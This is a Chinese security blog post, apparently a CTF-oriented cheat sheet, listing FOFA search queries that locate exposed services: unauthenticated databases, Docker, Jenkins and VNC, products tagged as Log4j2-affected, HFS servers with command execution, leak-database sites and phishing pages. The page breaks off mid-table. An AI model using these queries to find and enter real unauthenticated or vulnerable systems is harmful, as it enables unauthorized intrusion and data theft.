<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Jokak_blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="欢迎来到Jokak的博客哦,希望一起进步呀(￣y▽,￣)╭">
<meta property="og:type" content="website">
<meta property="og:title" content="Jokak_blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Jokak_blog">
<meta property="og:description" content="欢迎来到Jokak的博客哦,希望一起进步呀(￣y▽,￣)╭">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Jokak Doe">
<meta property="article:tag" content="网络安全">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Jokak_blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Jokak_blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-FOFA语法大全" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/06/27/FOFA%E8%AF%AD%E6%B3%95%E5%A4%A7%E5%85%A8/" class="article-date">
  <time class="dt-published" datetime="2023-06-27T06:59:44.000Z" itemprop="datePublished">2023-06-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/06/27/FOFA%E8%AF%AD%E6%B3%95%E5%A4%A7%E5%85%A8/">FOFA语法大全</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <table>
<thead>
<tr>
<th>序号</th>
<th>查询</th>
<th>规则名</th>
<th>规则英文名</th>
<th>描述</th>
<th>标签</th>
<th>FOFA语句</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>google-reverse</td>
<td>Google反代服务器</td>
<td>Google  Reverse proxy</td>
<td>不用挂代理就可以访问的Google搜索，但搜索记录可能会被记录。</td>
<td>google</td>
<td>body&#x3D;”var c &#x3D; Array.prototype.slice.call(arguments, 1);return function() {var d&#x3D;c.slice();”</td>
</tr>
<tr>
<td>2</td>
<td>python-simplehttp</td>
<td>Python  SimpleHTTP</td>
<td>Python  SimpleHTTP Server</td>
<td>Python  SimpleHTTP临时服务器</td>
<td>python</td>
<td>(server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.6.3” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.6.8” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.7.0” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.7.1” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.7.2” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.7.3” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.7.4” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.7.5” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.7.6” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.7.7” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.7.8” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.7.9” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.8.1” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.8.2” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.8.3” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.8.4” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.8.5” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.8.6” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.8.7” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.8.8” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.8.9” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.9.1” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.9.2” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.9.3” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.9.4” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.9.5” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.9.6” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.9.7” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.9.8” || server&#x3D;”SimpleHTTP&#x2F;0.6 Python&#x2F;3.9.9”) &amp;&amp; title&#x3D;”Directory listing for”</td>
</tr>
<tr>
<td>3</td>
<td>data-leak</td>
<td>社工库</td>
<td>data  leak</td>
<td>社工库</td>
<td>fun</td>
<td>title&#x3D;”社工库” || ((title&#x3D;”社工库” &amp;&amp; title&#x3D;”系统”) || (title&#x3D;”社工库查询” ))</td>
</tr>
<tr>
<td>4</td>
<td>hfs-rce</td>
<td>存在命令执行的HFS服务</td>
<td>Presence  of HFS services for command execution</td>
<td>这个语法可搜索存在命令执行的HFS服务，使用者多数为抓鸡黑客，可以直接上线能捡到不少有趣的东西~</td>
<td>fun</td>
<td>body&#x3D;”HttpFileServer v2.3 beta 287”</td>
</tr>
<tr>
<td>5</td>
<td>satellite-ftp</td>
<td>一键日卫星FTP？</td>
<td>Satellites  FTP</td>
<td>一键日卫星FTP？</td>
<td>fun</td>
<td>banner&#x3D;”Cobham SATCOM”</td>
</tr>
<tr>
<td>6</td>
<td>mk-mining</td>
<td>mk路由器全球挖矿感染</td>
<td>mk  router global mining infection</td>
<td>mk路由器全球挖矿感染</td>
<td>fun</td>
<td>app&#x3D;”Mikrotik-HttpProxy”&amp;&amp;(body&#x3D;”CoinHive.Anonymous” || body&#x3D;”CRLT.Anonymous” || body&#x3D;” WMP.Anonymous(“)”</td>
</tr>
<tr>
<td>7</td>
<td>ss-manager-login</td>
<td>ss-Manager  登录</td>
<td>ss-Manager  Login</td>
<td>Shadowsocks-Manager</td>
<td>fun</td>
<td>body&#x3D;”indeterminate” &amp;&amp; body&#x3D;”MainController” &amp;&amp; header&#x3D;”X-Powered-By: Express”</td>
</tr>
<tr>
<td>8</td>
<td>heating-monitor</td>
<td>供暖监控系统</td>
<td>Heating  monitoring systems</td>
<td>供暖监控系统</td>
<td>fun</td>
<td>body&#x3D;”s1v13.htm”</td>
</tr>
<tr>
<td>9</td>
<td>free-proxy</td>
<td>免费代理池</td>
<td>Free  Proxy Pool</td>
<td>获取免费代理池</td>
<td>fun</td>
<td>body&#x3D;”get all proxy from proxy pool”</td>
</tr>
<tr>
<td>10</td>
<td>honeypot</td>
<td>蜜罐</td>
<td>honeypot</td>
<td>蜜罐</td>
<td>fun</td>
<td>(header&#x3D;”uc-httpd 1.0.0” &amp;&amp; server&#x3D;”JBoss-5.0”) || server&#x3D;”Apache,Tomcat,Jboss,weblogic,phpstudy,struts”</td>
</tr>
<tr>
<td>11</td>
<td>hacked-website</td>
<td>被挂黑的站点</td>
<td>hacked  by xxx</td>
<td>被挂黑的站点</td>
<td>fun</td>
<td>body&#x3D;”hacked by”</td>
</tr>
<tr>
<td>12</td>
<td>jupyter-unauth</td>
<td>Jupyter  未授权</td>
<td>Jupyter  unauthorized</td>
<td>Jupyter  未授权访问</td>
<td>unauth</td>
<td>(body&#x3D;”ipython-main-app” &amp;&amp; title&#x3D;”Home Page - Select or create a notebook”)”</td>
</tr>
<tr>
<td>13</td>
<td>Apache-APISIX-Dashboard</td>
<td>APISIX  Dashboard</td>
<td>Apache  APISIX Dashboard</td>
<td>Apache  APISIX 仪表板旨在让用户尽可能轻松地通过前端界面操作 Apache APISIX。</td>
<td>unauth</td>
<td>title&#x3D;”Apache APISIX Dashboard”</td>
</tr>
<tr>
<td>14</td>
<td>flash-phishing</td>
<td>Flash  Phishing</td>
<td>Flash  Phishing</td>
<td>Flash  钓鱼攻击页面</td>
<td>flash,phish</td>
<td>icon_hash&#x3D;”1506728116” || body&#x3D;”ade42d4f682c4fca28c5f093052433c1”</td>
</tr>
<tr>
<td>15</td>
<td>redis-unauth</td>
<td>redis  unauth</td>
<td>redis  unauth</td>
<td>redis  unauthorized</td>
<td>redis,unauth</td>
<td>protocol&#x3D;”redis” &amp;&amp; banner!&#x3D;”NOAUTH Authentication required.”</td>
</tr>
<tr>
<td>16</td>
<td>MongoDB</td>
<td>MongoDB</td>
<td>MongoDB</td>
<td>MongoDB</td>
<td>mongodb,db,unauth</td>
<td>protocol&#x3D;”MongoDB”</td>
</tr>
<tr>
<td>17</td>
<td>Jenkins-unauth</td>
<td>Jenkins  unauth</td>
<td>Jenkins  unauth</td>
<td>Jenkins  unauth</td>
<td>jenkins,unauth</td>
<td>app&#x3D;”JENKINS” &amp;&amp; title&#x3D;&#x3D;”Dashboard [Jenkins]”</td>
</tr>
<tr>
<td>18</td>
<td>JBOSS-unauth</td>
<td>JBOSS  unauth</td>
<td>JBOSS  unauth</td>
<td>JBOSS  unauth</td>
<td>jboss,unauth</td>
<td>body&#x3D;”JBoss Management”</td>
</tr>
<tr>
<td>19</td>
<td>memcached</td>
<td>memcached</td>
<td>memcached</td>
<td>memcached</td>
<td>memcached,unauth</td>
<td>app&#x3D;”MEMCACHED”</td>
</tr>
<tr>
<td>20</td>
<td>hadoop-yarn</td>
<td>APACHE  hadoop YARN</td>
<td>APACHE  hadoop YARN</td>
<td>APACHE  hadoop YARN</td>
<td>hadoop,unauth</td>
<td>app&#x3D;”APACHE-hadoop-YARN”</td>
</tr>
<tr>
<td>21</td>
<td>kubernetes</td>
<td>kubernetes</td>
<td>kubernetes</td>
<td>kubernetes</td>
<td>kubernetes,unauth</td>
<td>app&#x3D;”kubernetes”</td>
</tr>
<tr>
<td>22</td>
<td>ZooKeeper</td>
<td>ZooKeeper</td>
<td>ZooKeeper</td>
<td>ZooKeeper</td>
<td>ZooKeeper,unauth</td>
<td>app&#x3D;”APACHE-ZooKeeper”</td>
</tr>
<tr>
<td>23</td>
<td>sqlserver</td>
<td>sqlserver</td>
<td>sqlserver</td>
<td>sqlserver</td>
<td>sqlserver,db,unauth</td>
<td>app&#x3D;”Microsoft-SQL-Server”</td>
</tr>
<tr>
<td>24</td>
<td>mysql</td>
<td>mysql</td>
<td>mysql</td>
<td>mysql</td>
<td>mysql,db,unauth</td>
<td>app&#x3D;”mysql”</td>
</tr>
<tr>
<td>25</td>
<td>vnc</td>
<td>VNC</td>
<td>VNC</td>
<td>VNC</td>
<td>vnc,unauth</td>
<td>app&#x3D;”VNC”</td>
</tr>
<tr>
<td>26</td>
<td>docker</td>
<td>docker</td>
<td>docker</td>
<td>docker</td>
<td>docker,unauth</td>
<td>protocol&#x3D;&#x3D;”docker”</td>
</tr>
<tr>
<td>27</td>
<td>CouchDB</td>
<td>CouchDB</td>
<td>CouchDB</td>
<td>CouchDB</td>
<td>CouchDB,db,unauth</td>
<td>app&#x3D;”APACHE-CouchDB”</td>
</tr>
<tr>
<td>28</td>
<td>rsync</td>
<td>rsync</td>
<td>rsync</td>
<td>rsync</td>
<td>rsync,unauth</td>
<td>app&#x3D;”rsync”</td>
</tr>
<tr>
<td>29</td>
<td>Atlassian-Crowd</td>
<td>Atlassian-Crowd</td>
<td>Atlassian-Crowd</td>
<td>Atlassian-Crowd</td>
<td>crowd,unauth</td>
<td>app&#x3D;”Atlassian-Crowd-Login”</td>
</tr>
<tr>
<td>30</td>
<td>nfs</td>
<td>nfs</td>
<td>nfs</td>
<td>nfs</td>
<td>nfs,unauth</td>
<td>“nfs” &amp;&amp; port&#x3D;”2049”</td>
</tr>
<tr>
<td>31</td>
<td>Dubbo</td>
<td>阿里-Dubbo</td>
<td>Dubbo</td>
<td>Dubbo</td>
<td>dubbo,unauth</td>
<td>app&#x3D;”阿里巴巴-dubbo”</td>
</tr>
<tr>
<td>32</td>
<td>ftp</td>
<td>ftp</td>
<td>ftp</td>
<td>ftp</td>
<td>ftp,unauth</td>
<td>protocol&#x3D;”ftp”</td>
</tr>
<tr>
<td>33</td>
<td>Kibana</td>
<td>Kibana</td>
<td>Kibana</td>
<td>Kibana</td>
<td>kibana,unauth</td>
<td>app&#x3D;”Kibana”</td>
</tr>
<tr>
<td>34</td>
<td>ldap</td>
<td>ldap</td>
<td>ldap</td>
<td>ldap</td>
<td>ldap,unauth</td>
<td>protocol&#x3D;”ldap”</td>
</tr>
<tr>
<td>35</td>
<td>Spark</td>
<td>Spark</td>
<td>Spark</td>
<td>Spark</td>
<td>spark,unauth</td>
<td>app&#x3D;”Spark”</td>
</tr>
<tr>
<td>36</td>
<td>weblogic  unauth</td>
<td>weblogic  unauth</td>
<td>weblogic  unauth</td>
<td>weblogic  unauth</td>
<td>weblogic,unauth</td>
<td>app&#x3D;”BEA-WebLogic-Server” || app&#x3D;”Weblogic_interface_7001”</td>
</tr>
<tr>
<td>37</td>
<td>zabbix</td>
<td>zabbix</td>
<td>zabbix</td>
<td>zabbix</td>
<td>zabbix,unauth</td>
<td>app&#x3D;”ZABBIX-监控系统”</td>
</tr>
<tr>
<td>38</td>
<td>alibaba-nacos</td>
<td>Alibaba  Nacos</td>
<td>Alibaba  Nacos</td>
<td>Alibaba  Nacos</td>
<td>nacos,unauth</td>
<td>title&#x3D;”Nacos”</td>
</tr>
<tr>
<td>39</td>
<td>cortex-xsoar</td>
<td>Cortex  XSOAR</td>
<td>Cortex  XSOAR</td>
<td>Cortex  XSOAR</td>
<td>xsoar,unauth</td>
<td>app&#x3D;”Cortex-XSOAR”</td>
</tr>
<tr>
<td>40</td>
<td>APACHE-ActiveMQ</td>
<td>APACHE  ActiveMQ</td>
<td>APACHE  ActiveMQ</td>
<td>&gt;Apache  ActiveMQ® 是最流行的开源、多协议、基于 Java 的消息代理。</td>
<td>log4j2,unauth,fofa</td>
<td>app&#x3D;”APACHE-ActiveMQ”</td>
</tr>
<tr>
<td>41</td>
<td>Apache_OFBiz</td>
<td>Apache  OFBiz</td>
<td>Apache  OFBiz</td>
<td>Apache  OFBiz是一个开源的企业资源计划系统。它提供了一套集成和自动化许多企业的业务流程的企业应用程序。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”Apache_OFBiz”</td>
</tr>
<tr>
<td>42</td>
<td>Jenkins</td>
<td>Jenkins</td>
<td>Jenkins</td>
<td>Jenkins是一款由Java编写的开源的持续集成工具。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”Jenkins”</td>
</tr>
<tr>
<td>43</td>
<td>RabbitMQ</td>
<td>RabbitMQ</td>
<td>RabbitMQ</td>
<td>RabbitMQ  是最流行的开源消息代理之一。RabbitMQ 是轻量级的，易于在本地和云中部署。</td>
<td>log4j2,unauth,fofa</td>
<td>app&#x3D;”RabbitMQ”</td>
</tr>
<tr>
<td>44</td>
<td>Jedis</td>
<td>Jedis</td>
<td>Jedis</td>
<td>Jedis是Redis官方推荐的Java连接开发工具。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”Jedis”</td>
</tr>
<tr>
<td>45</td>
<td>APACHE-tika</td>
<td>APACHE  tika</td>
<td>APACHE  tika</td>
<td>Apache  Tika是一个用java编写的内容检测和分析框架，是Apache的Lucene项目的子项目。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”APACHE-tika”</td>
</tr>
<tr>
<td>46</td>
<td>致远互联-FE</td>
<td>致远互联  FE</td>
<td>致远互联  FE</td>
<td>智远互联推出的办公自动化（Office  Automation，简称OA），是将计算机、通信等现代化技术运用到传统办公方式，进而形成的一种新型办公方式。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”致远互联-FE”</td>
</tr>
<tr>
<td>47</td>
<td>泛微-EMobile</td>
<td>泛微  EMobile</td>
<td>泛微  EMobile</td>
<td>e-mobile一款由上海泛微网络科技股份有限公司开发的移动办公产品，专门为手机、平板电脑等移动终端用户精心打造的移动办公产品。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”泛微-EMobile”</td>
</tr>
<tr>
<td>48</td>
<td>泛微-E-Weaver</td>
<td>泛微  E Weaver</td>
<td>泛微  E Weaver</td>
<td>泛微协同管理平台e-weaver继承e-cology八大功能模块应用，并可进一步打通企业更深层的个性管理需求，基于“协同”思想打造全面整合企业管理资源的环境。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”泛微-E-Weaver”</td>
</tr>
<tr>
<td>49</td>
<td>泛微-协同办公OA</td>
<td>泛微  协同办公OA</td>
<td>泛微  协同办公OA</td>
<td>泛微e-cology依托全新的设计理念，全新的管理思想，为中大型组织创建全新的高效协同办公环境。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”泛微-协同办公OA”</td>
</tr>
<tr>
<td>50</td>
<td>致远互联-OA</td>
<td>致远互联  OA</td>
<td>致远互联  OA</td>
<td>致远互联推出的办公自动化（Office  Automation，简称OA），是将计算机、通信等现代化技术运用到传统办公方式，进而形成的一种新型办公方式。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”致远互联-OA”</td>
</tr>
<tr>
<td>51</td>
<td>致远A6</td>
<td>致远A6</td>
<td>致远A6</td>
<td>用友致远A6协同管理系统：面向广大的企事业组织应用设计，是一个基于互联网的高效协同工作平台和优秀的协同管理系统。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”致远A6”</td>
</tr>
<tr>
<td>52</td>
<td>致远A8</td>
<td>致远A8</td>
<td>致远A8</td>
<td>A8协同管理软件是面向中型、大型、集团型组织机构、涉外工作组织及组织群，针对其异地管理、跨区域分支机构、跨地域审批等大范围协作应用设计的集团管控和信息资源管控的综合平台。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”致远A8”</td>
</tr>
<tr>
<td>53</td>
<td>用友-ERP-NC</td>
<td>用友  ERP NC</td>
<td>用友  ERP NC</td>
<td>用友NC服务大型企业互联网化，互联网创造了新的经济形态和运行模式，正在成为经济发展新引擎，企业互联网化是大型企业信息化的新进阶。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”用友-ERP-NC”</td>
</tr>
<tr>
<td>54</td>
<td>用友-GRP-U8</td>
<td>用友  GRP U8</td>
<td>用友  GRP U8</td>
<td>用友GRP-U8是由用友开发的行政事业单位内控的管理软件。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”用友-GRP-U8”</td>
</tr>
<tr>
<td>55</td>
<td>用友-UFIDA-NC</td>
<td>用友-UFIDA-NC</td>
<td>用友  UFIDA NC</td>
<td>UFIDA  NC是高端管理软件产品，提供了包括财务会计、管理会计、资金管理、资产管理、预算管理、人力资源管理、供应链、分销、多工厂制造、分析决策、合并报表等完整的解决方案。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”用友-UFIDA-NC”</td>
</tr>
<tr>
<td>56</td>
<td>jeewms</td>
<td>jeewms</td>
<td>jeewms</td>
<td>jeewms是一个基于JAVA的仓库管理系统,是由灵鹿谷科技主导的开源项目,WMS在经过多家公司上线运行后,为了降低物流仓储企业的信息化成本,决定全面开源此产品。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”jeewms”</td>
</tr>
<tr>
<td>57</td>
<td>APACHE-Skywalking</td>
<td>APACHE  Skywalking</td>
<td>APACHE  Skywalking</td>
<td>SkyWalking  是一个可观察性分析平台和应用程序性能管理系统。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”APACHE-Skywalking”</td>
</tr>
<tr>
<td>58</td>
<td>Struts2</td>
<td>Struts2</td>
<td>Struts2</td>
<td>Apache  Struts 2是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”Struts2”</td>
</tr>
<tr>
<td>59</td>
<td>APACHE-Shiro</td>
<td>APACHE  Shiro</td>
<td>APACHE  Shiro</td>
<td>Apache  Shiro是一个开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”APACHE-Shiro”</td>
</tr>
<tr>
<td>60</td>
<td>JEECMS</td>
<td>JEECMS</td>
<td>JEECMS</td>
<td>jeecms基于java、vue、springboot等技术自主研发的开源内容管理系统(cms,  java cms,jsp cms),可高效快捷新闻采编、发布、模板设计制作,具有性能稳定,安全,易扩展等特点</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”JEECMS”</td>
</tr>
<tr>
<td>61</td>
<td>JeeSite</td>
<td>JeeSite</td>
<td>JeeSite</td>
<td>JeeSite  是 Spring Boot 目前最好的快速开发平台, Java 开源框架,  使用经典技术组合：SpringBoot、SpringCloud、MyBatis、Shiro、Beetl、Bootstrap、AdminLTE 等。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”JeeSite”</td>
</tr>
<tr>
<td>62</td>
<td>APACHE-dubbo</td>
<td>APACHE  dubbo</td>
<td>APACHE  dubbo</td>
<td>Apache  Dubbo 是一款高性能、轻量级的开源服务框架。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”APACHE-dubbo”</td>
</tr>
<tr>
<td>63</td>
<td>OPENCms</td>
<td>OPENCms</td>
<td>OPENCms</td>
<td>OpenCms  是一个专业的、易于使用的网站内容管理系统。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”OPENCms”</td>
</tr>
<tr>
<td>64</td>
<td>JEECG</td>
<td>JEECG</td>
<td>JEECG</td>
<td>JeecgBoot是一款基于BPM的低代码平台！前后端分离架构  SpringBoot 2.x，SpringCloud，Ant  Design&amp;Vue，Mybatis-plus，Shiro，JWT，支持微服务。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”JEECG”</td>
</tr>
<tr>
<td>65</td>
<td>Jeeplus</td>
<td>Jeeplus</td>
<td>Jeeplus</td>
<td>Jeeplus，一个集成了代码生成器的java快速开发框架。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”Jeeplus”</td>
</tr>
<tr>
<td>66</td>
<td>MyBatis</td>
<td>MyBatis</td>
<td>MyBatis</td>
<td>MyBatis是一个Java持久化框架，它通过XML描述符或注解把对象与存储过程或SQL语句关联起来，映射成数据库内对应的纪录。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”MyBatis”</td>
</tr>
<tr>
<td>67</td>
<td>vmware-SpringBoot-Framework</td>
<td>vmware  SpringBoot Framework</td>
<td>vmware  SpringBoot Framework</td>
<td>Spring  Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”vmware-SpringBoot-Framework”</td>
</tr>
<tr>
<td>68</td>
<td>APACHE-Solr</td>
<td>APACHE-Solr</td>
<td>APACHE-Solr</td>
<td>Solr是Apache  Lucene项目的开源企业搜索平台。</td>
<td>log4j2,unauth,fofa</td>
<td>app&#x3D;”APACHE-Solr”</td>
</tr>
<tr>
<td>69</td>
<td>Map&#x2F;Reduce</td>
<td>Map&#x2F;Reduce</td>
<td>Map&#x2F;Reduce</td>
<td>Apache  Hadoop是一款支持数据密集型分布式应用程序并以Apache 2.0许可协议发布的开源软件框架。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”Map&#x2F;Reduce”</td>
</tr>
<tr>
<td>70</td>
<td>CLOUDERA-Hadoop-Hue</td>
<td>CLOUDERA  Hadoop Hue</td>
<td>CLOUDERA  Hadoop Hue</td>
<td>Apache  Hadoop是一款支持数据密集型分布式应用程序并以Apache 2.0许可协议发布的开源软件框架。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”CLOUDERA-Hadoop-Hue”</td>
</tr>
<tr>
<td>71</td>
<td>APACHE-hadoop-YARN</td>
<td>APACHE  hadoop YARN</td>
<td>APACHE  hadoop YARN</td>
<td>Apache  Hadoop是一款支持数据密集型分布式应用程序并以Apache 2.0许可协议发布的开源软件框架。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”APACHE-hadoop-YARN”</td>
</tr>
<tr>
<td>72</td>
<td>APACHE-hadoop-HttpFS</td>
<td>APACHE  hadoop HttpFS</td>
<td>APACHE  hadoop HttpFS</td>
<td>Apache  Hadoop是一款支持数据密集型分布式应用程序并以Apache 2.0许可协议发布的开源软件框架。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”APACHE-hadoop-HttpFS”</td>
</tr>
<tr>
<td>73</td>
<td>Oracle-E-Business-Suite</td>
<td>Oracle  E Business-Suite</td>
<td>Oracle  E Business-Suite</td>
<td>Oracle  电子商务套件支持当今不断发展的业务模型、提高生产力并满足现代移动用户的需求。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”Oracle-E-Business-Suite”</td>
</tr>
<tr>
<td>74</td>
<td>splunk-日志分析</td>
<td>splunk  日志分析</td>
<td>splunk  日志分析</td>
<td>Splunk  是用于机器生成数据、非结构化&#x2F;结构化和复杂多行数据的集中日志分析工具。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”splunk-日志分析”</td>
</tr>
<tr>
<td>75</td>
<td>vmware-vCenter</td>
<td>vmware  vCenter</td>
<td>vmware  vCenter</td>
<td>VMware  vCenter Server 提供了一个可伸缩、可扩展的平台，为虚拟化管理奠定了基础。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”vmware-vCenter”</td>
</tr>
<tr>
<td>76</td>
<td>APACHE-Storm</td>
<td>APACHE  Storm</td>
<td>APACHE  Storm</td>
<td>Storm  是一个分布式实时大数据处理系统，可以帮助我们方便地处理海量数据，具有高可靠、高容错、高扩展的特点。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”APACHE-Storm”</td>
</tr>
<tr>
<td>77</td>
<td>用友-NC-Cloud</td>
<td>用友  NC Cloud</td>
<td>用友  NC Cloud</td>
<td>NC  Cloud，帮助企业打造数字化商业创新平台，实现业务创新、管理变革、金融嵌入的全面数字化。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”用友-NC-Cloud”</td>
</tr>
<tr>
<td>78</td>
<td>APACHE-Druid</td>
<td>APACHE  Druid</td>
<td>APACHE  Druid</td>
<td>Druid是用Java编写的面向列的，开放源代码的分布式数据存储。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”APACHE-Druid”</td>
</tr>
<tr>
<td>79</td>
<td>vmware-Spring-Framework</td>
<td>vmware  Spring-Framework</td>
<td>vmware  Spring-Framework</td>
<td>Spring使Java编程对每个人都更快、更容易、更安全。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”vmware-Spring-Framework”</td>
</tr>
<tr>
<td>80</td>
<td>JavaMelody</td>
<td>JavaMelody</td>
<td>JavaMelody</td>
<td>JavaMelody  的目标是在 QA 和生产环境中监控 Java 或 Java EE 应用程序。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”JavaMelody”</td>
</tr>
<tr>
<td>81</td>
<td>openNMS-产品</td>
<td>openNMS  产品</td>
<td>openNMS  产品</td>
<td>OpenNMS是一个免费的开源企业级网络监视和网络管理平台。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”openNMS-产品”</td>
</tr>
<tr>
<td>82</td>
<td>APACHE-Unomi</td>
<td>APACHE  Unomi</td>
<td>APACHE  Unomi</td>
<td>Apache  Unomi是一个 Java 开源客户数据平台，是一个 Java 服务器。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”APACHE-Unomi”</td>
</tr>
<tr>
<td>83</td>
<td>ECLIPSE-jetty</td>
<td>ECLIPSE  jetty</td>
<td>ECLIPSE  jetty</td>
<td>Jetty是一个纯粹的基于Java的网页服务器和Java  Servlet容器。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”ECLIPSE-jetty”</td>
</tr>
<tr>
<td>84</td>
<td>elastic-Elasticsearch</td>
<td>elastic  Elasticsearch</td>
<td>elastic  Elasticsearch</td>
<td>Elasticsearch是一个基于Lucene库的搜索引擎。</td>
<td>log4j2,fofa,unauth</td>
<td>app&#x3D;”elastic-Elasticsearch”</td>
</tr>
<tr>
<td>85</td>
<td>RedHat-Jboss</td>
<td>RedHat  Jboss</td>
<td>RedHat  Jboss</td>
<td>一种开源的Java  EE 8 兼容应用服务器，让您只需构建Java 应用一次便可部署到所有位置。</td>
<td>log4j2,fofa</td>
<td>app&#x3D;”RedHat-Jboss”</td>
</tr>
<tr>
<td>86</td>
<td>Openfire</td>
<td>Openfire</td>
<td>Openfire</td>
